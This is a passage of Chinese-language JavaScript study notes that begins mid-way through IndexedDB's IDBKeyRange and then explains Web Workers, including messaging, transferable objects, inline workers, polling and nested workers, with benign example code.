var r4 = IDBKeyRange.lowerBound(y, true);

// All keys ≥ x && ≤ y
var r5 = IDBKeyRange.bound(x, y);

// All keys > x &&< y
var r6 = IDBKeyRange.bound(x, y, true, true);

// All keys > x && ≤ y
var r7 = IDBKeyRange.bound(x, y, true, false);

// All keys ≥ x &&< y
var r8 = IDBKeyRange.bound(x, y, false, true);

// The key = z
var r9 = IDBKeyRange.only(z);
```

`IDBKeyRange.lowerBound()`、`IDBKeyRange.upperBound()`、`IDBKeyRange.bound()`这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。

与之对应，IDBKeyRange 对象有四个只读属性。

- `IDBKeyRange.lower`：返回下限
- `IDBKeyRange.lowerOpen`：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）
- `IDBKeyRange.upper`：返回上限
- `IDBKeyRange.upperOpen`：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）

IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的`openCursor()`方法，就可以在所设定的范围内读取数据。

```
var t = db.transaction(['people'], 'readonly');
var store = t.objectStore('people');
var index = store.index('name');

var range = IDBKeyRange.bound('B', 'D');

index.openCursor(range).onsuccess = function (e) {
  var cursor = e.target.result;
  if (cursor) {
    console.log(cursor.key + ':');

    for (var field in cursor.value) {
      console.log(cursor.value[field]);
    }
    cursor.continue();
  }
}
```

IDBKeyRange 有一个实例方法`includes(key)`，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。

```
var keyRangeValue = IDBKeyRange.bound('A', 'K', false, false);

keyRangeValue.includes('F') // true
keyRangeValue.includes('W') // false
```



### 10.15 Web worker 

注意：这部分实际工作没用过，简单了解。

#### 概述

JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。

Web Worker 的作用，==就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行==。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。

Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。

Web Worker 有以下几个使用注意点。

（1）**同源限制**

分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。

（2）**DOM 限制**

==Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象==，也无法使用`document`、`window`、`parent`这些对象。但是，Worker 线程可以使用`navigator`对象和`location`对象。

（3）**全局对象限制**

Worker 的全局对象`WorkerGlobalScope`，不同于网页的全局对象`Window`，很多接口拿不到。比如，理论上 Worker 线程不能使用`console.log`，因为标准里面没有提到 Worker 的全局对象存在`console`接口，只定义了`Navigator`接口和`Location`接口。不过，浏览器实际上支持 Worker 线程使用`console.log`，保险的做法还是不使用这个方法。

（4）**通信联系**

Worker 线程和主线程不在同一个上下文环境，==它们不能直接通信，必须通过消息完成==。

（5）**脚本限制**

Worker 线程不能执行`alert()`方法和`confirm()`方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。

（6）**文件限制**

Worker 线程无法读取本地文件，即不能打开本机的文件系统（`file://`），它所加载的脚本，必须来自网络。

#### 基本用法

##### 主线程

主线程采用`new`命令，调用`Worker()`构造函数，新建一个 Worker 线程。

```js
var worker = new Worker('work.js');
// 构造函数是一个脚本文件。因为workder 不能读取本地文件，所以这个文件必须来源于网络并下载好。如果没有下载，worker就会失败
```

然后，主线程调用`worker.postMessage()`方法，向 Worker 发消息。

```js
worker.postMessage('Hello World');
worker.postMessage({method: 'echo', args: ['Work']});
```

`worker.postMessage()`方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。接着，主线程通过`worker.onmessage`指定监听函数，接收子线程发回来的消息。

```js
worker.onmessage = function (event) {
  worker.postMessage('Work done!');
  console.log(event.data);
}
// Worker 完成任务以后，主线程就可以把它关掉。
worker.terminate();
```



##### Worker 线程

Worker 线程内部需要有一个监听函数，监听`message`事件。

```js
self.addEventListener('message', function (e) {
  self.postMessage('You said: ' + e.data);
}, false);
```

上面代码中，`self`代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。

```js
// 写法一
this.addEventListener('message', function (e) {
  this.postMessage('You said: ' + e.data);
}, false);

// 写法二
addEventListener('message', function (e) {
  postMessage('You said: ' + e.data);
}, false);
```

除了使用`self.addEventListener()`指定监听函数，也可以使用`self.onmessage`指定。监听函数的参数是一个事件对象，它的`data`属性包含主线程发来的数据。`self.postMessage()`方法用来向主线程发送消息。

根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。

```js
self.addEventListener('message', function (e) {
  var data = e.data;
  switch (data.cmd) {
    case 'start':
      self.postMessage('WORKER STARTED: ' + data.msg);
      break;
    case 'stop':
      self.postMessage('WORKER STOPPED: ' + data.msg);
      self.close(); // Terminates the worker.
      break;
    default:
      self.postMessage('Unknown command: ' + data.msg);
  };
}, false);
```

上面代码中，`self.close()`用于在 Worker 内部关闭自身。

##### Worker 加载脚本

Worker 内部如果要加载其他脚本，有一个专门的方法`importScripts()`。

```
importScripts('script1.js');
```

该方法可以同时加载多个脚本。

```
importScripts('script1.js', 'script2.js');
```

##### 错误处理

主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的`error`事件。

```js
worker.onerror(function (event) {
  console.log([
    'ERROR: Line ', event.lineno, ' in ', event.filename, ': ', event.message
  ].join(''));
});

// 或者
worker.addEventListener('error', function (event) {
  // ...
});
```

Worker 内部也可以监听`error`事件。

##### 关闭 Worker

使用完毕，为了节省系统资源，必须关闭 Worker。

```js
// 主线程
worker.terminate();

// Worker 线程
self.close();
```

#### 数据通信

前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。

主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。

```js
// 主线程
var uInt8Array = new Uint8Array(new ArrayBuffer(10));
for (var i = 0; i < uInt8Array.length; ++i) {
  uInt8Array[i] = i * 2; // [0, 2, 4, 6, 8,...]
}
worker.postMessage(uInt8Array);

// Worker 线程
self.onmessage = function (e) {
  var uInt8Array = e.data;
  postMessage('Inside worker.js: uInt8Array.toString() = ' + uInt8Array.toString());
  postMessage('Inside worker.js: uInt8Array.byteLength = ' + uInt8Array.byteLength);
};
```

但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做[Transferable Objects](http://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects)。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。

如果要直接转移数据的控制权，就要使用下面的写法。

```js
// Transferable Objects 格式
worker.postMessage(arrayBuffer, [arrayBuffer]);

// 例子
var ab = new ArrayBuffer(1);
worker.postMessage(ab, [ab]);
```

#### 同页面的 Web Worker

通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。

```html
<!DOCTYPE html>
  <body>
    <script id="worker" type="app/worker">
      addEventListener('message', function () {
        postMessage('some message');
      }, false);
    </script>
  </body>
</html>
```

上面是一段嵌入网页的脚本，注意必须指定`<script>`标签的`type`属性是一个浏览器不认识的值，上例是`app/worker`。

然后，读取这一段嵌入页面的脚本，用 Worker 来处理。

```js
var blob = new Blob([document.querySelector('#worker').textContent]);
var url = window.URL.createObjectURL(blob);
var worker = new Worker(url);

worker.onmessage = function (e) {
  // e.data === 'some message'
};
```

上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。

#### 实例：Worker 线程完成轮询

有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。

```
function createWorker(f) {
  var blob = new Blob(['(' + f.toString() + ')()']);
  var url = window.URL.createObjectURL(blob);
  var worker = new Worker(url);
  return worker;
}

var pollingWorker = createWorker(function (e) {
  var cache;

  function compare(new, old) { ... };

  setInterval(function () {
    fetch('/my-api-endpoint').then(function (res) {
      var data = res.json();

      if (!compare(data, cache)) {
        cache = data;
        self.postMessage(data);
      }
    })
  }, 1000)
});

pollingWorker.onmessage = function () {
  // render data
}

pollingWorker.postMessage('init');
```

上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。

#### 实例： Worker 新建 Worker

Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。

主线程代码如下。

```
var worker = new Worker('worker.js');
worker.onmessage = function (event) {
  document.getElementById('result').textContent = event.data;
};
```

Worker 线程代码如下。

```
// worker.js

// settings
var num_workers = 10;
var items_per_worker = 1000000;

// start the workers
var result = 0;
var pending_workers = num_workers;
for (var i = 0; i < num_workers; i += 1) {
  var worker = new Worker('core.js');
  worker.postMessage(i * items_per_worker);
  worker.postMessage((i + 1) * items_per_worker);
  worker.onmessage = storeResult;
}

// handle the results
function storeResult(event) {
  result += event.data;
  pending_workers -= 1;
  if (pending_workers <= 0)
    postMessage(result); // finished!
}
```

上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。

```
// core.js
var start;
onmessage = getStart;
function getStart(event) {
  start = event.data;
  onmessage = getEnd;
}

var end;
function getEnd(event) {
  end = event.data;
  onmessage = null;
  work();
}

function work() {
  var result = 0;
  for (var i = start; i < end; i += 1) {
    // perform some complex calculation here
    result += 1;
  }
  postMessage(result);
  close();
}
```

#### API

##### 主线程

浏览器原生提供`Worker()`构造函数，用来供主线程生成 Worker 线程。

```
var myWorker = new Worker(jsUrl, options);
```

`Worker()`构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。

```
// 主线程
var myWorker = new Worker('worker.js', { name : 'myWorker' });

// Worker 线程
self.name // myWorker
```

`Worker()`构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。

- Worker.onerror：指定 error 事件的监听函数。
- Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在`Event.data`属性中。
- Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
- Worker.postMessage()：向 Worker 线程发送消息。
- Worker.terminate()：立即终止 Worker 线程。

##### Worker 线程

Web Worker 有自己的全局对象，不是主线程的`window`，而是一个专门为 Worker 定制的全局对象。因此定义在`window`上面的对象和方法不是全部都可以使用。

Worker 线程有一些自己的全局属性和方法。

- self.name： Worker 的名字。该属性只读，由构造函数指定。
- self.onmessage：指定`message`事件的监听函数。
- self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。
- self.close()：关闭 Worker 线程。
- self.postMessage()：向产生这个 Worker 线程发送消息。
- self.importScripts()：加载 JS 脚本。

